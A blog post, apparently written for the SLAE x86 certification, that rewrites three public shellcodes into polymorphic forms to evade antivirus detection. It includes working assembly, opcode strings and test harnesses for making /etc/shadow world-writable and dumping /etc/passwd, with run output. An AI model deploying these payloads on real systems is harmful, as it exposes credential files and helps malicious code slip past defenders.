---
title:  "SLAE x86 Assignment 6: Polymorphic Shellcode"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will look at assignment 6 of the SLAE x86 certification. Let's dive right in!

## Understanding The Objective ##
So what is Polymorphism? It is a technique used by exploit developers in order to prevent detection by anti-viruses, and make it hard for other security researchers to fingerprint and understand malicious shellcode. It is done by replacing instructions with similar ones, or by adding in arbitrary instructions that do not affect the operation of the shellcode, or both.

As you may imagine though, this will lead to an increase in size of the shellcode. With that being said, let's start with our first shellcode!

### Shellcode 1: [chmod(/etc/shadow, 0666) & exit()](http://shell-storm.org/shellcode/files/shellcode-556.php)
This shellcode will change the permissions of ```/etc/shadow``` to 666 by executing a ```chmod```. Written by ka0x, here is the original shellcode. It currently has a size of 33 bytes:
```c
#include <stdio.h>

/*
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009

    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!

*/

int main()
{

    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80

    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();

    return 0;
}
```
Here is a polymorphic version:
```nasm
; SLAE Assignment 6: Polymorphic chmod(/etc/shadow, 0666) & exit()
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start

section .text
_start:

      ;clear registers
      lahf                                        ;load flags
      cmc                                         ;complement the carry flag (random stuff)
      xor ecx, ecx                                ;ecx=0
      mul ecx                                     ;eax and ebx=0

      ;chmod
      add al,0xf                                  ;syscall number for chmod
      push ecx                                    ;push nulls onto the stack
      mov dword [esp-4], 0x776f6461               
      mov dword [esp-8], 0x68732f2f               
      mov dword [esp-12], 0x6374652f              ;/etc/shadow
      sub esp, 12                                 ;stack adjustment
      mov esi, esp                                ;move pointer to args into esi
      xchg ebx, esi                               ;move pointer to args into ebx
      push word 0x16d                             ;push 555
      pop ecx                                     ;pop it into ecx
      add ecx, 0x49                               ;add 111 to ecx, which makes it 666
      int 0x80                                    ;syscall
      xor eax, eax                                

      ;exit
      mov al, 0x1
      int 0x80
```
Alright, let's extract the shellcode:
```
$ ./compile.sh poly1
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
$ objdump -d ./poly1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x9f\xf5\x31\xc9\xf7\xe1\x04\x0f\x51\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x87\xde\x66\x68\x6d\x01\x59\x83\xc1\x49\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

keep in mind, we allow 7 opcodes per line
```
Let's paste this in ```shellcode.c```:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9f\xf5\x31\xc9\xf7\xe1\x04\x0f\x51\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x87\xde\x66\x68\x6d\x01\x59\x83\xc1\x49\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Let's compile and run:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~

before shellcode execution, permissions of /etc/shadow:
$ stat -c %a /etc/shadow                                                  
640

after:
$ sudo ./shellcode
Shellcode Length:  56
$ stat -c %a /etc/shadow    
666
```
The new length is 56 bytes, which is roughly a 70 percent increase in size.

### Shellcode 2: [Tiny Read File Shellcode - C Language - Linux/x86](http://shell-storm.org/shellcode/files/shellcode-842.php)
This shellcode will read and output 4096 bytes from a given file, which in our current case is ```/etc/passwd```. Written by geyslan, here is the original shellcode, with an initial size of 51 bytes:
```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
              "\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}
```
To extract the disassembly, we will use ```echo```, along with ```ndisasm```:
```
$ echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -

00000000  31C9              xor ecx,ecx
00000002  F7E1              mul ecx
00000004  B005              mov al,0x5
00000006  51                push ecx
00000007  6873737764        push dword 0x64777373
0000000C  68632F7061        push dword 0x61702f63
00000011  682F2F6574        push dword 0x74652f2f
00000016  89E3              mov ebx,esp
00000018  CD80              int 0x80
0000001A  93                xchg eax,ebx
0000001B  91                xchg eax,ecx
0000001C  B003              mov al,0x3
0000001E  31D2              xor edx,edx
00000020  66BAFF0F          mov dx,0xfff
00000024  42                inc edx
00000025  CD80              int 0x80
00000027  92                xchg eax,edx
00000028  31C0              xor eax,eax
0000002A  B004              mov al,0x4
0000002C  B301              mov bl,0x1
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  CD80              int 0x80
```
Alright, let's write the polymorphic version:
```nasm
; SLAE Assignment 6: Polymorphic Tiny Read(/etc/passwd)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start

section .text

_start:

        ;clearing registers
        lahf
        cmc
        xor eax, eax
        xor ebx, ebx
        push eax
        pop ecx
        cdq

        ;open()
        mov al,0x5                              ;syscall number for open()
        push ecx                                ;nulls
        mov dword [esp-4], 0x64777373
        mov dword [esp-8], 0x61702f63
        mov dword [esp-12], 0x74652f2f          ;/etc/passwd
        sub esp, 12                             ;stack adjustment
        mov ebx, esp                            ;pointer to args
        int 0x80                                ;syscall

        ;read()
        push eax                                ;push eax onto the stack
        push ebx                                ;push ebx onto the stack
        push ecx                                ;push ecx onto the stack
        pop eax                                 ;eax-->ecx (xchg eax,ecx)
        pop ecx                                 ;ecx-->ebx
        pop ebx                                 ;eax-->ebx (xchg eax,ebx)
        xor eax, eax                            ;eax=0
        mov al, 0x3                             ;syscall number for read()
        mov dx, 0xfff                           ;edx=4095
        inc edx                                 ;edx=4096
        int 0x80                                ;syscall

        ;write()
        push eax                                ;push eax onto the stack
        push edx                                ;push edx onto the stack
        pop eax                                 ;edx-->eax
        pop edx                                 ;eax-->edx (xchg eax,edx)
        xor eax, eax                            ;eax=0
        mov al, 0x4                             ;syscall number for write
        mov bl, 0x1                             ;ebx=0x1
        int 0x80                                ;syscall

        ;exit()
        xchg eax,ebx                            ;exit syscall
        int 0x80
```
Let's extract the shellcode:
```
$ ./compile.sh poly2
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
$ objdump -d ./poly2|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x9f\xf5\x31\xc0\x31\xdb\x50\x59\x99\xb0\x05\x51\xc7\x44\x24\xfc\x73\x73\x77\x64\xc7\x44\x24\xf8\x63\x2f\x70\x61\xc7\x44\x24\xf4\x2f\x2f\x65\x74\x83\xec\x0c\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\x31\xc0\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80"
```
Let's paste this in ```shellcode.c```:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9f\xf5\x31\xc0\x31\xdb\x50\x59\x99\xb0\x05\x51\xc7\x44\x24\xfc\x73\x73\x77\x64\xc7\x44\x24\xf8\x63\x2f\x70\x61\xc7\x44\x24\xf4\x2f\x2f\x65\x74\x83\xec\x0c\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\x31\xc0\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Let's compile and run:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~
$ sudo ./shellcode
Shellcode Length:  75
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```
The new length is 75 bytes, which is roughly a 48 percent increase in size.

## Shellcode 3: [sys_exit(0)](http://shell-storm.org/shellcode/files/shellcode-623.php)
This is a simple exit shellcode, i.e. it calls the exit() function. Written by gunslinger_, here is the original shellcode with a size of 8 bytes:
```c
/*
Name   : 8 bytes sys_exit(0) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char *bye=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		((void (*)(void)) bye)();
		return 0;
}
```
Let's write the polymorphic version. This time, I'm not going to focus on confusion. I'll rather try to save us a byte:
```nasm
; SLAE Assignment 6: Polymorphic Tiny Read(/etc/passwd)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start

section .text

_start:

      xor eax, eax            ;eax=0
      mov ebx, eax            ;ebx=0
      inc eax                 ;eax=1
      int 0x80                ;syscall
```
Let's extract the shellcode:
```
$ objdump -d ./poly3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x89\xc3\x40\xcd\x80"
```
Let's paste this into ```shellcode.c```:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x89\xc3\x40\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
Let's compile and run:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~
$ ./shellcode
Shellcode Length:  7
```
The new length is 7 bytes, which is roughly a 13 percent reduction in size.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE - 1534
